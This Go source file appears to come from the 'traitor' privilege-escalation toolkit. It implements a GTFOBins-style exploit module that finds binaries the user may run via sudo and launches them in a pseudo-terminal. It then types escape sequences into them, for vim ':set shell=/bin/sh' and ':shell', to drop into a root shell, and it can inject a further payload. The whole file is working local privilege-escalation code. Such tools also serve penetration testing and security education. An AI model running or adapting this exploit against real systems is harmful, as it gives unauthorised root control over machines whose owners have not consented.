package exploits

import (
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/creack/pty"
	"github.com/liamg/traitor/pkg/logger"
	"github.com/liamg/traitor/pkg/payloads"
	"github.com/liamg/traitor/pkg/state"
	"golang.org/x/crypto/ssh/terminal"
)

type gtfobinsExploit struct {
	binaryName string
	inputs     []string
	entry      *state.SudoEntry
}

func NewGTFOBinsExploit(binaryName string, inputs []string) *gtfobinsExploit {
	return &gtfobinsExploit{
		binaryName: binaryName,
		inputs:     inputs,
	}
}

func registerGTFOBinsExploit(binaryName string, inputs []string) {
	register(
		fmt.Sprintf("gtfobins:%s", binaryName),
		SpeedFast,
		NewGTFOBinsExploit(binaryName, inputs),
	)
}

func init() {
	registerGTFOBinsExploit("vim", []string{
		":",
		"set shell=/bin/sh\n",
		":shell\n",
	})
}

func (v *gtfobinsExploit) IsVulnerable(_ context.Context, state *state.State, log logger.Logger) bool {
	entry, err := state.SudoEntries.GetEntryForBinary(
		v.binaryName,
		state.HasPassword,
	)
	if err != nil || entry == nil {
		return false
	}
	if entry.AllCommands {
		if _, err := exec.LookPath(v.binaryName); err != nil {
			return false
		}
	}
	v.entry = entry
	return  true
}

func (v *gtfobinsExploit) Shell(ctx context.Context, s *state.State, log logger.Logger) error {
	return v.Exploit(ctx, s, log, payloads.Defer)
}

func (v *gtfobinsExploit) Exploit(ctx context.Context, s *state.State, log logger.Logger, payload payloads.Payload) error {

	command := v.entry.Command
	if v.entry.AllCommands {
		binaryPath, err := exec.LookPath(v.binaryName)
		if err != nil {
			return err
		}
		command = binaryPath
	}

	log.Printf("Using command '%s'...", command)

	args := strings.Split(command, " ")

	cmd := exec.Command("sudo", args...)

	log.Printf("Starting command with pty...")

	// Start the command with a pty.
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return err
	}
	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	log.Printf("Setting up terminal...")

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			_ = pty.InheritSize(os.Stdin, ptmx)
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.

	// Set stdin in raw mode.
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return err
	}
	defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.

	expChan := make(chan error)

	log.Printf("Exploiting and dropping payload...")

	go func() {
		for _, input := range v.inputs {
			time.Sleep(time.Millisecond * 100)
			if _, err := ptmx.Write([]byte(input)); err != nil {
				expChan <- err
				return
			}
		}
		if payload != payloads.Defer {
			time.Sleep(time.Millisecond * 200)
			if _, err := ptmx.Write([]byte(payload)); err != nil {
				expChan <- err
				return
			}
		}
		expChan <- nil
	}()

	// Copy stdin to the pty and the pty to stdout.
	go func() { _, _ = io.Copy(ptmx, os.Stdin) }()
	_, _ = io.Copy(os.Stdout, ptmx)

	return <-expChan
}
